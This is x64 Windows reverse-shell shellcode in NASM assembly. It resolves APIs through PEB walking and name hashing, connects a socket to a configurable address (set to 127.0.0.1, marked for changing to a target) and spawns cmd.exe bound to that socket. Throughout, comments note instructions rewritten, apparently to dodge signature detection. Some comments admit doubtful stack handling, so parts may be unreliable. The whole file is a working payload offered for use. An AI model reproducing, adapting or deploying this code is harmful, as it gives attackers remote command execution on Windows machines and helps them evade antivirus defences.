BITS 64
org 0

  cld
  and rsp, byte -0x10         ; Align stack to 16 bytes (0xfffffffffffffff0)
  call get_rip                ; Call the pop rbp instruction to get RIP

; --- Start of API resolver stub ---
api_resolver_start:
  push r9
  push r8
  push rdx
  push rcx
  push rsi
  sub rdx, rdx                ; Replaced xor rdx, rdx
  mov rdx, [gs:rdx+0x60]      ; Get PEB address
  mov rdx, [rdx+0x18]         ; PEB->Ldr
  mov rdx, [rdx+0x20]         ; Ldr->InMemoryOrderModuleList.Flink (First entry)

find_mod_base:                ; Label for the loop finding the module base address
  mov rsi, [rdx+0x50]         ; Module->BaseDllName (Unicode)
  movzx rcx, word [rdx+0x4a]  ; Module->BaseDllName.Length
  sub r9, r9                  ; Replaced xor r9, r9

hash_mod_loop_start:          ; Label for the start of the module name hashing loop
  sub rax, rax                ; Replaced xor rax, rax
  lodsb                       ; Load byte [rsi] into al, increment rsi
  cmp al, 0x61                ; Compare with 'a'
  jl hash_mod_skip_case       ; Jump if below 'a' (already uppercase or symbol)
  sub al, 0x20                ; Convert to uppercase
hash_mod_skip_case:           ; Label for skipping lowercase conversion
  ror r9d, byte 0xd           ; Rotate hash
  add r9d, eax                ; Add character (treat eax as zero-extended al)
  loop hash_mod_loop_start    ; Decrement rcx, loop if not zero

  ; Module hash calculated in r9. Now find function hash in this module.
  push rdx                    ; Save current module LDR_DATA_TABLE_ENTRY address
  push r9                     ; Save module hash
  mov rdx, [rdx+0x20]         ; Get module BaseAddress

  ; --- Parse PE Export Table ---
  mov eax, [rdx+0x3c]         ; Offset to PE Header (e_lfanew)
  add rax, rdx                ; Address of PE Header
  mov eax, [rax+0x88]         ; RVA of Export Directory Table
  test rax, rax               ; Check if EAT exists
  jz find_libs_failed         ; Jump if no EAT (go to next module)
  add rax, rdx                ; Address of EAT
  push rax                    ; Save EAT address
  mov ecx, [rax+0x18]         ; NumberOfNames
  mov r8d, [rax+0x20]         ; RVA of AddressOfNames array
  add r8, rdx                 ; Address of AddressOfNames array

find_libs_loop:               ; Label for looping through export names
  jrcxz find_libs_failed2     ; Jump if ecx is 0 (no names left in this module)
  dec rcx                     ; Decrement name index
  mov esi, [r8+rcx*4]         ; RVA of name string
  add rsi, rdx                ; Address of name string
  sub r9, r9                  ; Replaced xor r9, r9

hash_func_loop_start:         ; Label for start of function name hashing loop
  sub rax, rax                ; Replaced xor rax, rax
  lodsb                       ; Load byte [rsi] into al, increment rsi
  ror r9d, byte 0xd           ; Rotate hash
  add r9d, eax                ; Add character
  cmp al, ah                  ; Check for null terminator (ah is usually 0 from sub rax,rax)
  jnz hash_func_loop_start    ; Jump if not null

  add r9, [rsp+0x8]           ; Add module hash (previously pushed) to function hash
  cmp r9d, r10d               ; Compare calculated hash with target hash (in r10d)
  jnz find_libs_loop          ; Jump if no match, try next function name

  ; --- Function Hash Found ---
  pop rax                     ; Restore EAT address
  mov r8d, [rax+0x24]         ; RVA of AddressOfNameOrdinals array
  add r8, rdx                 ; Address of AddressOfNameOrdinals array
  mov cx, [r8+rcx*2]          ; Get function ordinal from array using name index (rcx)
  mov r8d, [rax+0x1c]         ; RVA of AddressOfFunctions array
  add r8, rdx                 ; Address of AddressOfFunctions array
  mov eax, [r8+rcx*4]         ; Get RVA of function from array using ordinal (cx)
  add rax, rdx                ; Address of function = BaseAddress + RVA

  ; --- Cleanup and Return Function Address ---
  pop r8                      ; Pop saved module hash (don't need it)
  pop r8                      ; Pop saved LDR_DATA_TABLE_ENTRY address (don't need it)
  pop rsi
  pop rcx
  pop rdx
  pop r8                      ; Pop originally pushed registers
  pop r9
  pop r10                     ; Pop original target hash (we clobbered r10, but need to balance stack)
  sub rsp, byte 0x20          ; Restore shadow space
  push r10                    ; Put original target hash back on stack? Seems odd, maybe placeholder/stack balance.
  jmp rax                     ; Jump to the function address found in rax

find_libs_failed2:            ; Label for failure within a module (after EAT address pushed)
  pop rax                     ; Pop EAT address pushed earlier
find_libs_failed:             ; Label for failure (no EAT or no matching function in module)
  pop r9                      ; Pop module hash
  pop rdx                     ; Pop LDR_DATA_TABLE_ENTRY address
  mov rdx, [rdx]              ; Get next entry (InMemoryOrderLinks.Flink)
  jmp find_mod_base           ; Jump back to process the next module
; --- End of API resolver stub ---


; --- Main Payload Logic ---
get_rip:                      ; Label called by the first `call` instruction
  pop rbp                     ; Pop return address (address of api_resolver_start) into rbp

  ; Store "ws2_32" hash string ('ws2_32\0') and set up pointers
  mov r14, 0x000032335f327377
  push r14                    ; Push "ws2_32" string
  mov r14, rsp                ; r14 = pointer to "ws2_32" string

  ; Allocate stack space and set up sockaddr_in
  sub rsp, 0x1a0              ; Allocate space for WSAData, sockaddr_in, STARTUPINFO, PROCESS_INFORMATION
  mov r13, rsp                ; r13 = Pointer to WSAData buffer

  ; Store SOCKADDR_IN structure for connect() - MODIFY FOR YOUR TARGET
  mov r12, 0x0100007f611e0002 ; Needs correct target IP/Port bytes!
  push r12                    ; Push sockaddr_in struct onto stack
  mov r12, rsp                ; r12 = pointer to sockaddr_in struct

  ; Call LoadLibraryA("ws2_32.dll")
  mov rcx, r14                ; Arg1: lpLibFileName ("ws2_32")
  mov r10d, 0x0726774c        ; Hash for LoadLibraryA
  call rbp                    ; Call API resolver

  ; Call WSAStartup(MAKEWORD(2, 2), &WSAData) - Opt 1 applied
  mov rdx, r13                ; Arg2: lpWSAData
  mov cx, 0x0202              ; Arg1: wVersionRequired = MAKEWORD(2,2)
  mov r10d, 0x006b8029        ; Hash for WSAStartup
  call rbp                    ; Call API resolver

  ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
  push rax                    ; Save WSAStartup return value (unused but balances stack)
  push rax                    ; Align stack or placeholder
  sub r9, r9                  ; Replaced xor r9, r9 ; Arg6: dwFlags = 0
  sub r8, r8                  ; Replaced xor r8, r8 ; Arg5: g = 0
  inc rax                     ; Assumes WSAStartup ret 0 -> rax=1
  mov rdx, rax                ; Arg2: type = SOCK_STREAM (1)
  inc rax                     ; rax = 2
  mov rcx, rax                ; Arg1: af = AF_INET (2)
  mov r10d, 0xe0df0fea        ; Hash for WSASocketA
  call rbp                    ; Call API resolver
  mov rdi, rax                ; Save socket handle in rdi


  mov r8b, 0x10               ; Replaced push/pop with mov r8b, 0x10 ; Arg3: namelen = 16
  mov rdx, r12                ; Arg2: name (pointer to sockaddr_in struct)
  mov rcx, rdi                ; Arg1: s (socket handle)
  mov r10d, 0x6174a599        ; Hash for connect
  call rbp                    ; Call API resolver

  ; Clean up stack
  add rsp, 0x240

  ; Prepare for CreateProcessA - Keeping original "cmd" loading (Opt 3 reverted)
  mov r8, 0x646d63            ; Load "cmd\0" into r8 (implicit null padding)
  push r8                     ; Push "cmd" string
  push r8                     ; Push "cmd" string again (original does this)
  mov rdx, rsp                ; Arg2: lpCommandLine (points to the second push)

  ; Setup STARTUPINFOA structure
  push rdi                    ; hStdError = socket handle
  push rdi                    ; hStdOutput = socket handle
  push rdi                    ; hStdInput = socket handle
  sub r8, r8                  ; Replaced xor r8, r8 ; Zero r8 for pushing nulls
  mov cl, 0xd                 ; Opt 2 Applied ; Loop count = 13
zero_startupinfo_loop:        ; Label for zeroing loop
  push r8                     ; Push 8 bytes of NULL
  loop zero_startupinfo_loop  ; Zero out 104 bytes for STARTUPINFOA members

  ; Set STARTUPINFOA members (following original offsets meticulously)
  mov word [rsp+0x54], 0x101  ; dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW (0x100 | 0x1)
  lea rax, [rsp+0x18]         ; Get address into STARTUPINFOA buffer
  mov byte [rax], 0x68        ; STARTUPINFOA.cb = 104 (0x68)
  mov rsi, rsp                ; rsi = pointer to STARTUPINFOA

  ; Prepare remaining CreateProcessA args on stack and registers
  push rsi                    ; Arg10: lpStartupInfo (on stack)
  push rax                    ; Arg9: lpProcessInformation (address calculated before)
  push r8                     ; Arg8: lpCurrentDirectory = NULL (r8 is 0 from sub r8,r8)
  push r8                     ; Arg7: lpEnvironment = NULL
  push r8                     ; Arg6: dwCreationFlags = 0 (placeholder push)
  inc r8                      ; r8 = 1
  push r8                     ; Arg5: bInheritHandles = TRUE (1)
  dec r8                      ; r8 = 0
  mov r9, r8                  ; R9 = 0 (used for CreationFlags in x64 call)
  mov rcx, r8                 ; RCX = 0 (used for lpThreadAttributes in x64 call)

  ; Call CreateProcessA
  mov r10d, 0x863fcc79        ; Hash for CreateProcessA
  call rbp                    ; Call API resolver

  ; Call WaitForSingleObject(hProcess, INFINITE)
  sub rdx, rdx                ; Replaced xor rdx, rdx ; Zero rdx
  dec rdx                     ; rdx = -1 (INFINITE)
  mov ecx, [rsi]              ; Arg1: hProcess (handle from PROCESS_INFORMATION struct? - still suspicious based on rsi)
  mov r10d, 0x601d8708        ; Hash for WaitForSingleObject
  call rbp                    ; Call API resolver

  ; Call TerminateProcess(hProcess, 0) - Original tries this first
  mov ebx, 0x56a2b5f0         ; Save ExitProcess hash for later
  mov r10d, 0x9dbd95a6        ; Hash for TerminateProcess
  call rbp                    ; Call API resolver (rcx/rdx likely hold args from WaitForSingleObject)

  ; Clean up stack - Opt 4 applied (Block removed)
  add rsp, byte 0x28

exit_prep:                    ; Label for exit preparation
  sub cl, cl                  ; Replaced push 0/pop rcx with sub cl, cl ; Arg1: uExitCode = 0
  mov r10d, ebx               ; Use ExitProcess hash (0x56a2b5f0)
  call rbp                    ; Call API resolver (final call)